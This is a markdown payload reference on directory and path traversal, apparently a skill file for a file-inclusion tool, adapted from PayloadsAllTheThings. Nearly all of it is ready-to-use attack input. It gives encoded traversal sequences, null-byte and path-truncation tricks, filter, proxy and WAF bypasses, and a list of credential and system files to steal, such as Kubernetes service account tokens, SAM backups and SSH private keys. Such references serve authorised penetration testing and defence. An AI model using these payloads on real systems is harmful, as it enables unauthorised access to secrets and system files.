---
description: Encoding variants, null byte, double URL encoding, OS-specific paths
skill: file-inclusion
source: PayloadsAllTheThings — Directory Traversal
source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
source_license: MIT; see THIRD_PARTY_NOTICES.md
---

# Directory / Path Traversal Payloads

> Source: PayloadsAllTheThings — Directory Traversal

## Basic Sequences

```
../
..\
..\/
/..;/         (Tomcat / NGINX bypass)
```

## Encoding Variants

### Double URL Encoding

```
%252e%252e%252f  = ../
%252e%252e%255c  = ..\
```

### Unicode / UTF-8 Encoding

```
%u002e%u002e%u2215   = ../
%c0%ae%c0%ae%c0%af   = ../  (overlong UTF-8)
%c0%2e               = .
%e0%40%ae            = .
%c0%ae               = .
%c0%af               = /
%e0%80%af            = /
```

## Null Byte Injection

```
../../../etc/passwd%00
../../../etc/passwd%00.png
../../../etc/passwd%00.html
.%00./.%00./etc/passwd
```

Works on older PHP (< 5.3.4), older Java, and some other runtimes.

```
# Path truncation (4096+ chars, PHP < 5.3)
../../../etc/passwd/./././././.[repeat to 4096+ chars]
../../../etc/passwd............[repeat to 4096+ chars]
```

## Traversal Pattern Bypasses

### Filter Evasion (Recursive Stripping)

```
....//....//....//etc/passwd
..././..././..././etc/passwd
....\\....\\....\\windows\\win.ini
```

### Redundant Slashes

```
..///////..////..//////etc/passwd
```

### Reverse Proxy Bypass (NGINX + Tomcat)

```
..;/
/..;/..;/etc/passwd
```

### ASP.NET Cookieless Session Bypass

```
/(S(X))/admin/(S(X))/main.aspx
/(A(X)F(Y))/path
```

## OS-Specific Interesting Files

### Linux

```
/etc/passwd
/proc/self/environ
/proc/self/cmdline
/proc/self/cwd/
/proc/self/fd/0
/proc/version
/proc/net/tcp
/run/secrets/kubernetes.io/serviceaccount/token
```

### Windows

```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\system32\license.rtf
C:\windows\repair\sam
C:\windows\repair\system
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\
C:\xampp\apache\conf\httpd.conf
C:\Users\[user]\.ssh\id_rsa
```

## WAF Bypass Patterns

```
# URL encoding + traversal
..%c0%af..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd

# Windows UNC
\\localhost\c$\windows\win.ini
```
